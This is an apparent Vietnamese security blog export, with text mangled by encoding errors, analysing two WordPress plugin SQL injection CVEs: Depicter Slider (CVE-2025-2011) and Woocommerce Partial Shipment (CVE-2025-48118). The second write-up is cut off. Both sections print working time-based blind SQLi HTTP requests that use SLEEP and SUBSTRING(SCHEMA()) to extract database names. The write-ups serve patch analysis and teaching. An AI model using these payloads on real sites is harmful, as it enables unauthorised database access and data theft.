th·ªÉ compare ƒë·ªÉ th·∫•y ƒë∆∞·ª£c s·ª± kh√°c bi·ªát gi·ªØa 2 version Analysis Nguy√™n nh√¢n c·ªë l√µi do ·ª©ng d·ª•ng ch√®n tr·ª±c ti·∫øp d·ªØ li·ªáu t·ª´ GET request v√†o SQL query m√† kh√¥ng c√≥ c∆° ch·∫ø ki·ªÉm so√°t ch·∫∑t ch·∫Ω.\nPatch Diff D√πng diff tool b·∫•t k√¨ ƒë·ªÉ so s√°nh s·ª± kh√°c bi·ªát gi·ªØa b·∫£n l·ªói v√† b·∫£n v√°. C√≥ s·ª± kh√°c bi·ªát r√µ ·ªü file app/src/Controllers/Ajax/LeadsAjaxController.php\nindex, list, export l√† 3 h√†m ƒë√°ng ch√∫ √Ω n·∫±m trong class LeadsAjaxController\npublic function index(RequestInterface $request, $view) { $args = [ \u0026#39;s\u0026#39; =\u0026gt; Sanitize::textfield($request-\u0026gt;query(\u0026#39;s\u0026#39;, \u0026#39;\u0026#39;)), // other logic ]; $response = \\Depicter::lead()-\u0026gt;get($args); $statusCode = isset($response[\u0026#39;errors\u0026#39;]) ? 400 : 200; return \\Depicter::json($response)-\u0026gt;withStatus($statusCode); } {: file=\u0026ldquo;app/src/Controllers/Ajax/LeadsAjaxController.php v3.2\u0026rdquo; }\npublic function list(RequestInterface $request, $view) { $args = [ \u0026#39;s\u0026#39; =\u0026gt; Sanitize::textfield($request-\u0026gt;query(\u0026#39;s\u0026#39;, \u0026#39;\u0026#39;)), // other logic ]; $response = \\Depicter::leadRepository()-\u0026gt;getResults($args); return \\Depicter::json($response); } {: file=\u0026ldquo;app/src/Controllers/Ajax/LeadsAjaxController.php v3.2\u0026rdquo; }\npublic function export(RequestInterface $request, $view) { $args = [ \u0026#39;s\u0026#39; =\u0026gt; Sanitize::textfield($request-\u0026gt;query(\u0026#39;s\u0026#39;, \u0026#39;\u0026#39;)), // other logic ]; $response = \\Depicter::leadRepository()-\u0026gt;getResults($args); // other logic return \\Depicter::json([ \u0026#39;errors\u0026#39; =\u0026gt; [__(\u0026#39;error occurred during the export process\u0026#39;, \u0026#39;depicter\u0026#39;)] ])-\u0026gt;withStatus(400); } {: file=\u0026ldquo;app/src/Controllers/Ajax/LeadsAjaxController.php v3.2\u0026rdquo; }\nC·∫£ 3 h√†m ƒë·ªÅu ƒë∆∞·ª£c v√° b·∫±ng c√°ch s·ª≠ d·ª•ng Sanitize::sql thay cho Sanitize::textfield nh·∫±m ƒë·∫£m b·∫£o param 's' ƒë∆∞·ª£c l√†m s·∫°ch v√† escape ph√π h·ª£p cho ng·ªØ c·∫£nh c√¢u l·ªánh SQL.\nHow it work? ƒê·ªÉ hi·ªÉu r√µ h∆°n ch·ª©c nƒÉng c·ªßa textfield v√† sql ta t√¨m ki·∫øm v·ªõi t·ª´ kh√≥a function textfield, c√≥ l·∫Ω ch√∫ng ƒë∆∞·ª£c ƒë·∫∑t trong c√πng 1 file v√¨ ƒë∆∞·ª£c g·ªçi b·∫±ng c√πng 1 class Sanitize\nN·∫øu b·∫°n ƒë√£ c√†i PHP Intelephense Extension trong vscode, b·∫°n c√≥ th·ªÉ di chuy·ªÉn ƒë·∫øn h√†m c·ª• th·ªÉ b·∫±ng c√°ch Ctrl + Click v√†o h√†m c·∫ßn ƒë·∫øn. {: .prompt-tip }\ntextfield tr·∫£ v·ªÅ d·ªØ li·ªáu ƒë√£ ƒë∆∞·ª£c sanitize b·∫±ng sanitize_text_field, sql c≈©ng l√† h√†m trong c√πng class, tr·∫£ v·ªÅ d·ªØ li·ªáu ƒë√£ ƒë∆∞·ª£c escape SQL\npublic static function sql( $input ) { return esc_sql( $input ); } {: file=\u0026ldquo;vendor/averta/wordpress/src/Utility/Sanitize.php v3.2\u0026rdquo; }\nV√¨ ƒë√¢y l√† l·ªó h·ªïng unauthenticated, vi·ªác c√≥ 3 h√†m nh∆∞ n√†y, ta c·∫ßn x√°c ƒë·ªãnh xem ƒëi·ªÉm g·ªçi ƒë·∫øn ch√∫ng c√≥ c∆° ch·∫ø x√°c th·ª±c hay kh√¥ng. Ch·ªâ sau khi ch·∫Øc ch·∫Øn r·∫±ng h√†m n√†o th·ª±c s·ª± ƒë∆∞·ª£c g·ªçi trong b·ªëi c·∫£nh kh√¥ng y√™u c·∫ßu x√°c th·ª±c, ta m·ªõi ti·∫øp t·ª•c ph√¢n t√≠ch ph·∫ßn logic b√™n trong ƒë·ªÉ ki·ªÉm tra kh·∫£ nƒÉng g√¢y ra SQL Injection gi√∫p gi·ªõi h·∫°n ph·∫°m vi truy v·∫øt.\nƒê·ªÉ x√°c ƒë·ªãnh 3 h√†m tr√™n ƒë∆∞·ª£c g·ªçi ·ªü ƒë√¢u, ta c√≥ th·ªÉ t√¨m ki·∫øm tr·ª±c ti·∫øp theo t√™n h√†m. Tuy nhi√™n, c√°c t·ª´ kh√≥a nh∆∞ index, list, hay export l·∫°i qu√° ph·ªï bi·∫øn n√™n k·∫øt qu·∫£ t√¨m ki·∫øm s·∫Ω r·∫•t nhi·ªÅu v√† kh√≥ l·ªçc. V√¨ v·∫≠y, thay v√¨ t√¨m theo t√™n h√†m, ta t√¨m v·ªõi t·ª´ kh√≥a l√† t√™n class LeadsAjaxController. B·ªüi l·∫Ω khi ƒë∆∞·ª£c s·ª≠ d·ª•ng, c√°c h√†m n√†y ƒë·ªÅu ph·∫£i ƒë∆∞·ª£c g·ªçi th√¥ng qua class, nh·ªù ƒë√≥ ph·∫°m vi k·∫øt qu·∫£ t√¨m ki·∫øm s·∫Ω ƒë∆∞·ª£c thu h·∫πp v√† d·ªÖ d√†ng h∆°n.\nüëâ LeadsAjaxController ƒë∆∞·ª£c s·ª≠ d·ª•ng trong qu√° tr√¨nh ƒëƒÉng k√Ω route Ajax. Khi c√≥ request g·ª≠i t·ªõi endpoint /wp-admin/admin-ajax.php?action=action_here\u0026amp;param1=param1_here\u0026amp;paramN=paramN_here, h·ªá th·ªëng s·∫Ω d·ª±a tr√™n khai b√°o handle('LeadsAjaxController@function') ƒë·ªÉ g·ªçi t·ªõi ph∆∞∆°ng th·ª©c t∆∞∆°ng ·ª©ng trong class LeadsAjaxController\nC·∫£ ba h√†m ta ƒëang focus ƒë·ªÅu ƒë∆∞·ª£c g·ªçi b·∫±ng ph∆∞∆°ng th·ª©c GET, nh∆∞ng export l·∫°i c√≥ middleware x·ª≠ l√Ω csrf-api, n√™n ta b·ªè qua. Ch·ªâ truy v·∫øt index v√† list\nKhi ph√¢n t√≠ch hai h√†m n√†y, ta th·∫•y trong h√†m index, bi·∫øn $response ƒë∆∞·ª£c g√°n gi√° tr·ªã t·ª´ \\Depicter::lead()-\u0026gt;get($args). Tuy nhi√™n, ph∆∞∆°ng th·ª©c get() l·∫°i ti·∫øp t·ª•c g·ªçi ƒë·∫øn \\Depicter::leadRepository()-\u0026gt;getResults($args), t·ª©c l√† c√πng m·ªôt logic m√† h√†m list ƒë√£ g·ªçi tr·ª±c ti·∫øp. Do ƒë√≥, ta ch·ªçn h√†m list l√†m ƒëi·ªÉm truy v·∫øt ch√≠nh.\npublic function list(RequestInterface $request, $view) { $args = [ \u0026#39;s\u0026#39; =\u0026gt; Sanitize::textfield($request-\u0026gt;query(\u0026#39;s\u0026#39;, \u0026#39;\u0026#39;)), \u0026#39;ids\u0026#39; =\u0026gt; Sanitize::textfield($request-\u0026gt;query(\u0026#39;ids\u0026#39;, \u0026#39;\u0026#39;)), \u0026#39;sources\u0026#39; =\u0026gt; Sanitize::textfield($request-\u0026gt;query(\u0026#39;sources\u0026#39;, \u0026#39;\u0026#39;)), \u0026#39;dateStart\u0026#39; =\u0026gt; Sanitize::textfield($request-\u0026gt;query(\u0026#39;dateStart\u0026#39;, \u0026#39;\u0026#39;)), \u0026#39;dateEnd\u0026#39; =\u0026gt; Sanitize::textfield($request-\u0026gt;query(\u0026#39;dateEnd\u0026#39;, \u0026#39;\u0026#39;)), \u0026#39;order\u0026#39; =\u0026gt; Sanitize::textfield($request-\u0026gt;query(\u0026#39;order\u0026#39;, \u0026#39;DESC\u0026#39;)), \u0026#39;orderBy\u0026#39; =\u0026gt; Sanitize::textfield($request-\u0026gt;query(\u0026#39;orderBy\u0026#39;, \u0026#39;id\u0026#39;)), \u0026#39;page\u0026#39; =\u0026gt; Sanitize::int($request-\u0026gt;query(\u0026#39;page\u0026#39;, 1)), \u0026#39;perPage\u0026#39; =\u0026gt; Sanitize::int($request-\u0026gt;query(\u0026#39;perpage\u0026#39;, 10)), \u0026#39;columns\u0026#39; =\u0026gt; Sanitize::textfield($request-\u0026gt;query(\u0026#39;columns\u0026#39;, \u0026#39;\u0026#39;)), \u0026#39;includeFields\u0026#39; =\u0026gt; Sanitize::textfield($request-\u0026gt;query(\u0026#39;includeFields\u0026#39;, false)), \u0026#39;skipCustomFields\u0026#39; =\u0026gt; Sanitize::textfield($request-\u0026gt;query(\u0026#39;skipCustomFields\u0026#39;, false)) ]; $response = \\Depicter::leadRepository()-\u0026gt;getResults($args); return \\Depicter::json($response); } {: file=\u0026ldquo;app/src/Controllers/Ajax/LeadsAjaxController.php v3.2\u0026rdquo; }\nƒê·ªÉ bi·∫øt getResults th·ª±c thi query nh∆∞ n√†o, ta t√¨m ki·∫øm v·ªõi t·ª´ kh√≥a function getResults ho·∫∑c Ctrl + Click v√†o getResults\nüëâ Khi t√¨m ki·∫øm, ta th·∫•y k·∫øt qu·∫£ c√≥ hai h√†m getResults. D·ª±a v√†o t√™n class c√≥ th·ªÉ nh·∫≠n th·∫•y s·ª± li√™n quan gi·ªØa class LeadRepository v√† h√†m leadRepository(), nhi·ªÅu kh·∫£ nƒÉng Depicter::leadRepository() s·∫Ω tr·∫£ v·ªÅ m·ªôt instance c·ªßa class LeadRepository. B√™n c·∫°nh ƒë√≥, ta c√≥ th·ªÉ d·ª±a v√†o s·ªë l∆∞·ª£ng tham s·ªë truy·ªÅn v√†o ƒë·ªÉ x√°c ƒë·ªãnh ch√≠nh x√°c h√†m getResults n√†o m·ªõi l√† h√†m c·∫ßn ph√¢n t√≠ch.\nTa th·∫•y ƒëi·ªÅu ki·ªán if,khi kh√¥ng c√≥ param includeFields th√¨ getLeadsResults s·∫Ω ƒë∆∞·ª£c g·ªçi, quan s√°t getLeadsResults trong c√πng class:\nprotected function getLeadsResults( $args ){ // Purpose of joining tables is being able to search in leadField values as well $leadTable = $this-\u0026gt;lead()-\u0026gt;getTable(); $leads = Lead::new()-\u0026gt;select( \u0026#34;{$leadTable}.id\u0026#34;, \u0026#34;{$leadTable}.source_id\u0026#34;, \u0026#34;{$leadTable}.content_id\u0026#34;, \u0026#34;{$leadTable}.content_name\u0026#34;, \u0026#34;{$leadTable}.created_at\u0026#34;, \u0026#34;lf.name as fieldName\u0026#34;, \u0026#34;lf.value as fieldValue\u0026#34; )-\u0026gt;join( \u0026#34;{$this-\u0026gt;leadField()-\u0026gt;getTable()} AS lf\u0026#34;, \u0026#34;{$leadTable}.id\u0026#34;, \u0026#34;=\u0026#34;, \u0026#34;lf.lead_id\u0026#34; ); // other logic if( ! empty( $args[\u0026#39;s\u0026#39;] ) ){ $search = \u0026#34;\u0026#39;%\u0026#34;. $args[\u0026#39;s\u0026#39;] .\u0026#34;%\u0026#39;\u0026#34;; $leads-\u0026gt;appendRawWhere(\u0026#39;AND\u0026#39;, \u0026#34;( lf.value like {$search} OR {$leadTable}.content_name like {$search} )\u0026#34;); } $results = $this-\u0026gt;paginate( $leads, $args ); } {: file=\u0026ldquo;app/src/Database/Repository/LeadRepository.php v3.2\u0026rdquo; }\nTa th·∫•y param s, n∆°i ƒë∆∞·ª£c b·∫£n v√° b·∫£o v·ªá ƒë√£ ƒë∆∞·ª£c n·ªëi tr·ª±c ti·∫øp v√†o c√¢u query b·∫±ng h√†m appendRawWhere. Khi ƒë√≥ 1 ph·∫ßn query t∆∞∆°ng ·ª©ng s·∫Ω l√†:\nAND (lf.value like \u0026#39;%s_here%\u0026#39; OR leadtable.content_name like \u0026#39;%s_here%\u0026#39;) üëâ Nh∆∞ v·∫≠y khi g·ª≠i GET request ƒë·∫øn /wp-admin/admin-ajax.php v·ªõi params:\naction=depicter-lead-index\u0026amp;s=payload_here list ƒë∆∞·ª£c g·ªçi v·ªõi duy nh·∫•t param s ƒë∆∞·ª£c th√™m v√†o $args, c√≤n l·∫°i ƒë∆∞·ª£c set gi√° tr·ªã m·∫∑c ƒë·ªãnh getResults ƒë∆∞·ª£c g·ªçi v·ªõi ƒë·ªëi s·ªë $args ƒêi·ªÅu ki·ªán if( ! $args['includeFields'] ) trong getResults khi includeFields m·∫∑c ƒë·ªãnh l√† false =\u0026gt; getLeadsResults ƒë∆∞·ª£c g·ªçi Th·ª±c hi·ªán truy v·∫•n g√¢y l·ªói SQLi Exploit Detect SQLi G·ª≠i GET request ch·ª©a payload SQLi.\nGET /wp-admin/admin-ajax.php?action=depicter-lead-list\u0026amp;s=999%25\u0026#39;+AND+(SELECT+1+FROM+(SELECT+SLEEP(5))a))+--+-+ HTTP/1.1 Host: localhost ... Cookie: cookie_here Payload ƒë∆∞·ª£c decode:\n999%\u0026#39; AND (SELECT 1 FROM (SELECT SLEEP(5))a)) -- - Khi ƒë√≥ m·ªôt ph·∫ßn c·ªßa c√¢u query tr·ªü th√†nh\nAND (lf.value like \u0026#39;999%\u0026#39; AND (SELECT 1 FROM (SELECT SLEEP(5))a)) -- \u0026#39; OR leadtable.content_name like \u0026#39;999%\u0026#39; AND (SELECT 1 FROM (SELECT SLEEP(5))a)) #\u0026#39;) üëâ D·ª±a tr√™n th·ªùi gian ph·∫£n h·ªìi =\u0026gt; payload ho·∫°t ƒë·ªông.\nSubquery trong m·ªánh ƒë·ªÅ FROM: Truy v·∫•n con ƒë∆∞·ª£c coi l√† b·∫£ng t·∫°m th·ªùi. MySQL ph·∫£i th·ª±c thi truy v·∫•n con n√†y ƒë·∫ßu ti√™n ƒë·ªÉ t·∫°o b·∫£ng t·∫°m th·ªùi, sau ƒë√≥ m·ªõi th·ª±c thi truy v·∫•n ch√≠nh.\nGet First Letter of Database Name ƒêi·ªÅu ki·ªán ti√™n quy·∫øt ƒë·ªÉ dump ƒë∆∞·ª£c h·∫øt data l√† ph·∫£i dump ƒë∆∞·ª£c 1 k√Ω t·ª± b·∫•t k·ª≥ c·ªßa t√™n database, n·∫øu l·∫•y ƒë∆∞·ª£c th√¨ g·∫ßn nh∆∞ to√†n b·ªô data ƒë·ªÅu dump ƒë∆∞·ª£c.\nG·ª≠i request v·ªõi SQLi payload:\nGET /wp-admin/admin-ajax.php?action=depicter-lead-list\u0026amp;s=999%25\u0026#39;+AND+(SELECT+1+FROM+(SELECT+IF(SUBSTRING(SCHEMA(),1,1)=0x77,SLEEP(5),1))a))+--+-+ HTTP/1.1 Host: localhost ... Cookie: cookie_here S·ª≠ d·ª•ng SUBSTRING() ƒë·ªÉ l·∫•y k√Ω t·ª± ƒë·∫ßu ti√™n c·ªßa database name, IF() tr·∫£ v·ªÅ SLEEP(5) n·∫øu k√Ω t·ª± ƒë√≥ l√† 0x77(\u0026lsquo;w\u0026rsquo;)\nS·ª≠ d·ª•ng hex encoding w th√†nh 0x77 v√¨ s ƒë∆∞·ª£c l·∫•y t·ª´ GET request trong n√™n b·ªã escape b·ªüi magic quotes trong WordPress v√† b·ªüi sanitize_text_field.\nüëâ D·ª±a tr√™n th·ªùi gian ph·∫£n h·ªìi =\u0026gt; k√≠ t·ª± ƒë·∫ßu ti√™n ƒë√∫ng l√† w.\nD·ª±a tr√™n kƒ© thu·∫≠t Timebased SQLi ta vi·∫øt script ƒë·ªÉ t·ª± ƒë·ªông khai th√°c.\nScript here\nConclusion L·ªó h·ªïng CVE-2025-2011 trong plugin WordPress Depicter Slider tr∆∞·ªõc phi√™n b·∫£n 3.6.2, xu·∫•t ph√°t t·ª´ vi·ªác truy·ªÅn tr·ª±c ti·∫øp input t·ª´ ng∆∞·ªùi d√πng v√†o SQL query m√† kh√¥ng c√≥ bi·ªán ph√°p ki·ªÉm so√°t ch·∫∑t ch·∫Ω d·∫´n ƒë·∫øn l·ªó h·ªïng SQL Injection.\nB·∫£n v√° ƒë√£ escape SQL khi·∫øn d·ªØ li·ªáu tr∆∞·ªõc khi ƒë∆∞a v√†o tr·ªü th√†nh chu·ªói thu·∫ßn kh√¥ng th·ªÉ tho√°t ra kh·ªèi '%...%'\nKey takeaways:\nKi·ªÉm so√°t k·ªπ input t·ª´ ng∆∞·ªùi d√πng. Lu√¥n s·ª≠ d·ª•ng $wpdb-\u0026gt;prepare() khi l√†m vi·ªác v·ªõi database trong WordPress ƒë·ªÉ tr√°nh SQL Injection. Th∆∞·ªùng xuy√™n c·∫≠p nh·∫≠t plugin v√† ki·ªÉm tra b·∫£o m·∫≠t ƒë·ªÉ tr√°nh tr·ªü th√†nh m·ª•c ti√™u t·∫•n c√¥ng. References SQL Injection cheat sheet - PortSwigger\nWordPress Depicter Slider Plugin \u0026lt;= 3.6.1 is vulnerable to SQL Injection ","permalink":"//localhost:1313/vi/posts/2025-09-11-cve-2025-2011/","summary":"\u003ch2 id=\"introduction\"\u003eIntroduction\u003c/h2\u003e\n\u003cp\u003eL·ªó h·ªïng x·∫£y ra tr√™n plugin \u003cstrong\u003eDepicter Slider\u003c/strong\u003e c·ªßa WordPress tr∆∞·ªõc phi√™n b·∫£n \u003cstrong\u003e3.6.2\u003c/strong\u003e. ƒêi·ªÅu n√†y c√≥ th·ªÉ cho ph√©p k·∫ª t·∫•n c√¥ng tr·ª±c ti·∫øp t∆∞∆°ng t√°c v·ªõi c∆° s·ªü d·ªØ li·ªáu c·ªßa b·∫°n, bao g·ªìm kh√¥ng gi·ªõi h·∫°n ·ªü vi·ªác ƒë√°nh c·∫Øp th√¥ng tin.\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e\u003cstrong\u003eCVE ID\u003c/strong\u003e: \u003ca href=\"https://www.cve.org/CVERecord?id=CVE-2025-2011\"\u003eCVE-2025-2011\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eProduct\u003c/strong\u003e: \u003ca href=\"https://wordpress.org/plugins/depicter/\"\u003eWordPress Depicter Slider Plugin\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eVulnerability Type\u003c/strong\u003e: SQL Injection\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eAffected Versions\u003c/strong\u003e: \u0026lt;= 3.6.1\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eCVSS severity\u003c/strong\u003e:  High (9.3)\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eRequired Privilege\u003c/strong\u003e: Unauthenticated\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch2 id=\"requirements\"\u003eRequirements\u003c/h2\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ca href=\"https://w41bu1.github.io/posts/wordpress-local-and-debugging/\"\u003e\u003cstrong\u003eLocal WordPress and Debugging\u003c/strong\u003e\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eDepicter Slider\u003c/strong\u003e:  v3.6.1(vul) v√† v3.6.2(fix)\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003ediff tool\u003c/strong\u003e: \u003cstrong\u003emeld\u003c/strong\u003e ho·∫∑c b·∫•t c·ª© tool n√†o c√≥ th·ªÉ compare ƒë·ªÉ th·∫•y ƒë∆∞·ª£c s·ª± kh√°c bi·ªát gi·ªØa 2 version\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch2 id=\"analysis\"\u003eAnalysis\u003c/h2\u003e\n\u003cp\u003eNguy√™n nh√¢n c·ªë l√µi do ·ª©ng d·ª•ng ch√®n tr·ª±c ti·∫øp d·ªØ li·ªáu t·ª´ \u003cstrong\u003eGET\u003c/strong\u003e request v√†o SQL query m√† kh√¥ng c√≥ c∆° ch·∫ø ki·ªÉm so√°t ch·∫∑t ch·∫Ω.\u003c/p\u003e","title":"CVE-2025-2011"},{"content":"Introduction L·ªó h·ªïng x·∫£y ra tr√™n plugin Woocommerce Partial Shipment c·ªßa WordPress tr∆∞·ªõc phi√™n b·∫£n 3.3. ƒêi·ªÅu n√†y c√≥ th·ªÉ cho ph√©p k·∫ª t·∫•n c√¥ng tr·ª±c ti·∫øp t∆∞∆°ng t√°c v·ªõi c∆° s·ªü d·ªØ li·ªáu c·ªßa b·∫°n, bao g·ªìm kh√¥ng gi·ªõi h·∫°n ·ªü vi·ªác ƒë√°nh c·∫Øp th√¥ng tin.\nCVE ID: CVE-2025-48118 Product: WordPress Woocommerce Partial Shipment Plugin Vulnerability Type: SQL Injection Affected Versions: \u0026lt;= 3.2 CVSS severity: High (8.5) Required Privilege: Subscriber Requirements Local WordPress and Debugging Woocommerce Partial Shipment: v3.2(vul) v√† v3.3(fix) diff tool: meld ho·∫∑c b·∫•t c·ª© tool n√†o c√≥ th·ªÉ compare ƒë·ªÉ th·∫•y ƒë∆∞·ª£c s·ª± kh√°c bi·ªát gi·ªØa 2 version Actived WooCommerce plugin: plugin b·∫Øt bu·ªôc actived tr∆∞·ªõc khi c√†i Woocommerce Partial Shipment Plugin, m·ªôt s·ªë h√†m trong WooCommerce s·∫Ω ƒë∆∞·ª£c s·ª≠ d·ª•ng. Analysis Nguy√™n nh√¢n c·ªë l√µi do ·ª©ng d·ª•ng ch√®n tr·ª±c ti·∫øp d·ªØ li·ªáu t·ª´ POST request v√†o SQL query m√† kh√¥ng c√≥ c∆° ch·∫ø ki·ªÉm so√°t ch·∫∑t ch·∫Ω.\nPatch Diff D√πng diff tool b·∫•t k√¨ ƒë·ªÉ so s√°nh s·ª± kh√°c bi·ªát gi·ªØa b·∫£n l·ªói v√† b·∫£n v√°. C√≥ s·ª± kh√°c bi·ªát r√µ ·ªü file wc-partial-shipment/woocommerce-partial-shipment.php\nNh∆∞ng ·ªü ƒë√¢y, dev thay ƒë·ªïi kh√° nhi·ªÅu ta kh√≥ ƒë·ªÉ t√¨m ƒë∆∞·ª£c v·ªã tr√≠ l·ªói.\nTrong WordPress, ƒë·ªÉ SQLi x·∫£y ra, ·ª©ng d·ª•ng ph·∫£i t∆∞∆°ng t√°c v·ªõi database th√¥ng qua bi·∫øn global $wpdb, ta search t·ª´ kh√≥a n√†y trong file wc-partial-shipment/woocommerce-partial-shipment.php ƒë·ªÉ t√¨m sink. {: .prompt-tip }\nget_shipment_id v√† get_wxp_shipment_data l√† 2 h√†m thu·ªôc class WXP_Partial_Shipment ƒë√°ng ch√∫ √Ω, d·ªØ li·ªáu ƒë∆∞·ª£c ƒë∆∞a th·∫≥ng v√†o c√¢u query m√† kh√¥ng c√≥ c∆° ch·∫ø ki·ªÉm so√°t n√†o. Do ƒë√≥, l·ªó h·ªïng SQLi c√≥ th·ªÉ x·∫£y ra.\nB·∫£n v√° s·ª≠ d·ª•ng $wpdb-\u0026gt;prepare() ƒë·ªÉ chu·∫©n b·ªã c√¢u query, thay v√¨ n·ªëi tr·ª±c ti·∫øp d·ªØ li·ªáu t·ª´ ng∆∞·ªùi d√πng. ƒêi·ªÅu n√†y ƒë·∫£m b·∫£o r·∫±ng t·∫•t c·∫£ gi√° tr·ªã ƒë∆∞·ª£c escape ƒë√∫ng c√°ch tr∆∞·ªõc khi ch√®n v√†o SQL, ngƒÉn ng·ª´a nguy c∆° SQL Injection.\nHow it work? get_shipment_id v√† get_wxp_shipment_data ƒë·ªÅu ƒë∆∞·ª£c h√†m wxp_order_set_shipped trong c√πng class g·ªçi v√† s·ª≠ d·ª•ng.\nfunction wxp_order_set_shipped(){ $order_id = isset($_POST[\u0026#39;order_id\u0026#39;]) ? $_POST[\u0026#39;order_id\u0026#39;] : 0; // other logic $wxp_shipment = $this-\u0026gt;get_wxp_shipment_data($order_id); if(isset($_POST[\u0026#39;order_id\u0026#39;]) \u0026amp;\u0026amp; $_POST[\u0026#39;order_id\u0026#39;]){ global $wpdb; $shipment_id = $this-\u0026gt;get_shipment_id($_POST[\u0026#39;order_id\u0026#39;]); if(!$shipment_id){ $data = array( \u0026#39;order_id\u0026#39; =\u0026gt;$order_id, \u0026#39;shipment_id\u0026#39; =\u0026gt;1, \u0026#39;shipment_url\u0026#39;=\u0026gt;\u0026#39;\u0026#39;, \u0026#39;shipment_num\u0026#39;=\u0026gt;\u0026#39;\u0026#39;, \u0026#39;shipment_date\u0026#39;=\u0026gt;current_time(\u0026#39;timestamp\u0026#39;,0), ); $wpdb-\u0026gt;insert($wpdb-\u0026gt;prefix.\u0026#34;partial_shipment\u0026#34;,$data,array(\u0026#39;%d\u0026#39;,\u0026#39;%d\u0026#39;,\u0026#39;%s\u0026#39;,\u0026#39;%s\u0026#39;,\u0026#39;%s\u0026#39;)); $shipment_id = $wpdb-\u0026gt;insert_id; } // other logic } echo json_encode(array(\u0026#39;order_id\u0026#39;=\u0026gt;$order_id,\u0026#39;status\u0026#39;=\u0026gt;$status_key)); exit(); } üëâ order_id ƒë∆∞·ª£c l·∫•y t·ª´ POST request, n∆°i ng∆∞·ªùi d√πng c√≥ th·ªÉ ki·ªÉm so√°t l√†m ƒë·ªëi s·ªë khi g·ªçi h√†m get_shipment_id v√† get_wxp_shipment_data truy·ªÅn v√†o c√¢u query ch·ª©a l·ªï h·ªóng SQLi.\nƒê·ªÉ x√°c ƒë·ªãnh n∆°i wxp_order_set_shipped ƒë∆∞·ª£c g·ªçi v√† s·ª≠ d·ª•ng, ta t√¨m ki·∫øm v·ªõi t·ª´ kh√≥a wxp_order_set_shipped trong th∆∞ m·ª•c ch·ª©a plugin.\nwxp_order_set_shipped ƒë∆∞·ª£c construct c·ªßa c√πng class s·ª≠ d·ª•ng l√†m callback cho hook wp_ajax_wxp_order_set_shipped =\u0026gt; y√™u c·∫ßu ng∆∞·ªùi d√πng ph·∫£i ƒëƒÉng nh·∫≠p\nüëâ Khi truy c·∫≠p v√†o /wp-admin/admin-ajax.php v·ªõi tham s·ªë:\naction=wxp_order_set_shipped\u0026amp;order_id=payload_here Callback wxp_order_set_shipped ƒë∆∞·ª£c g·ªçi order_id ƒë∆∞·ª£c l·∫•y tr·ª±c ti·∫øp t·ª´ request v√† ch√®n v√†o SQL query. Query th·ª±c thi 2 l·∫ßn do ƒë∆∞·ª£c truy·ªÅn v√†o 2 h√†m ch·∫°y l·ªánh SQL v·ªõi payload ƒë·ªôc h·∫°i. Exploit Detect SQLi G·ª≠i POST request ch·ª©a payload SQLi.\nPOST /wp-admin/admin-ajax.php HTTP/1.1 Host: localhost ... Cookie: cookie_here action=wxp_order_set_shipped\u0026amp;order_id=(SELECT 1 FROM (SELECT SLEEP(5))a) Khi ƒë√≥ c√¢u query s·∫Ω tr·ªü th√†nh:\nSELECT id as ship_id FROM wp_partial_shipment WHERE order_id=(SELECT 1 FROM (SELECT SLEEP(5))a) ·ªû ƒë√¢y c√≥ 2 n∆°i th·ª±c hi·ªán query n√™n th·ªùi gian ph·∫£n h·ªìi s·∫Ω tƒÉng g·∫•p ƒë√¥i\nTa s·ª≠ d·ª•ng subquery trong m·ªánh ƒë·ªÅ FROM v√¨ truy v·∫•n con ƒë∆∞·ª£c coi nh∆∞ m·ªôt b·∫£ng t·∫°m th·ªùi. MySQL s·∫Ω th·ª±c thi truy v·∫•n con tr∆∞·ªõc ƒë·ªÉ t·∫°o b·∫£ng t·∫°m, sau ƒë√≥ m·ªõi th·ª±c hi·ªán truy v·∫•n ch√≠nh. Khi so s√°nh theo t·ª´ng row, SLEEP ch·ªâ ch·∫°y m·ªôt l·∫ßn trong qu√° tr√¨nh kh·ªüi t·∫°o b·∫£ng t·∫°m, c√°c l·∫ßn so s√°nh ti·∫øp theo s·∫Ω kh√¥ng th·ª±c thi l·∫°i, nh·ªù ƒë√≥ tr√°nh vi·ªác SLEEP b·ªã nh√¢n nhi·ªÅu l·∫ßn.\nV√≠ d·ª• khi g·ª≠i request v·ªõi payload n√†y:\nPOST /wp-admin/admin-ajax.php HTTP/1.1 Host: localhost ... Cookie: cookie_here action=wxp_order_set_shipped\u0026amp;order_id=(SELECT SLEEP(5)) Th·ªùi gian tr·∫£ v·ªÅ tƒÉng theo c·∫•p s·ªë nh√¢n\nGet First Letter of Database Name ƒêi·ªÅu ki·ªán ti√™n quy·∫øt ƒë·ªÉ dump ƒë∆∞·ª£c h·∫øt data l√† ph·∫£i dump ƒë∆∞·ª£c 1 k√Ω t·ª± b·∫•t k·ª≥ c·ªßa t√™n database, n·∫øu l·∫•y ƒë∆∞·ª£c th√¨ g·∫ßn nh∆∞ to√†n b·ªô data ƒë·ªÅu dump ƒë∆∞·ª£c.\nG·ª≠i request v·ªõi SQLi payload:\nPOST /wp-admin/admin-ajax.php HTTP/1.1 Host: localhost ... Cookie: cookie_here action=wxp_order_set_shipped\u0026amp;order_id=(SELECT 1 FROM (SELECT IF(SUBSTRING(SCHEMA(),1,1)=0x77, SLEEP(5), 1))a) S·ª≠ d·ª•ng SUBSTRING() ƒë·ªÉ l·∫•y k√Ω t·ª± ƒë·∫ßu ti√™n c·ªßa database name, IF() tr·∫£ v·ªÅ SLEEP(5) n·∫øu k√Ω t·ª± ƒë√≥ l√† 0x77(\u0026lsquo;w\u0026rsquo;)\nS·ª≠ d·ª•ng hex encoding w th√†nh 0x77 v√¨ order_id ƒë∆∞·ª£c l·∫•y t·ª´ POST request trong n√™n b·ªã escape b·ªüi magic quotes trong WordPress v√† b·ªüi sanitize_text_field.\nüëâ D·ª±a tr√™n th·ªùi gian ph·∫£n h·ªìi =\u0026gt; k√≠ t·ª± ƒë·∫ßu ti√™n ƒë√∫ng l√† w.\nD·ª±a tr√™n kƒ© thu·∫≠t Timebased SQLi ta vi·∫øt script 